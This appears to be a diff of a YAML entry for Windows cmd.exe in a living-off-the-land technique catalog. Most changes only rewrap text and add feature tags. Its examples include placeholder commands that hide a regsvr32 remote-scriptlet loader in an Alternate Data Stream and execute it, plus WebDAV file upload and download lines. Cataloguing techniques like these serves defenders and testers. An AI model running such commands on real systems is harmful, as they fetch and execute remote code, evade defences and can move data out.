@@ -2,7 +2,8 @@
 id: windows-ads-cmd
 namespace: windows:ads:cmd
 name: cmd
-description: 'The command-line interpreter in Windows Located at: C:\Windows\System32\cmd.exe; C:\Windows\SysWOW64\cmd.exe.'
+description: 'The command-line interpreter in Windows Located at: C:\Windows\System32\cmd.exe;
+  C:\Windows\SysWOW64\cmd.exe.'
 author: Ye Yint Min Thu Htut
 version: 1.0.0
 capabilities:
@@ -44,7 +45,13 @@ resource_profile:
 allowed-tools:
 - cmd
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdin
+- pipes-stdout
+- streaming
 execution:
   template: cmd
   sandbox: execFile
@@ -52,13 +59,18 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Add content to an Alternate Data Stream (ADS). (Can be used to evade defensive countermeasures or to hide as a persistence mechanism)
-  command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat
-- description: Execute payload.bat stored in an Alternate Data Stream (ADS). (Can be used to evade defensive countermeasures or to hide as a persistence mechanism)
+- description: Add content to an Alternate Data Stream (ADS). (Can be used to evade
+    defensive countermeasures or to hide as a persistence mechanism)
+  command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll >
+    {PATH}:payload.bat
+- description: Execute payload.bat stored in an Alternate Data Stream (ADS). (Can
+    be used to evade defensive countermeasures or to hide as a persistence mechanism)
   command: cmd.exe - < {PATH}:payload.bat
-- description: Downloads a specified file from a WebDAV server to the target file. (Download/copy a file from a WebDAV server)
+- description: Downloads a specified file from a WebDAV server to the target file.
+    (Download/copy a file from a WebDAV server)
   command: type {PATH_SMB} > {PATH_ABSOLUTE}
-- description: Uploads a specified file to a WebDAV server. (Upload a file to a WebDAV server)
+- description: Uploads a specified file to a WebDAV server. (Upload a file to a WebDAV
+    server)
   command: type {PATH_ABSOLUTE} > {PATH_SMB}
 references:
 - label: '1143824979139579904'
@@ -95,7 +107,6 @@ install:
   commands:
   - choco install cmd
 ---
-
 
 # cmd
 
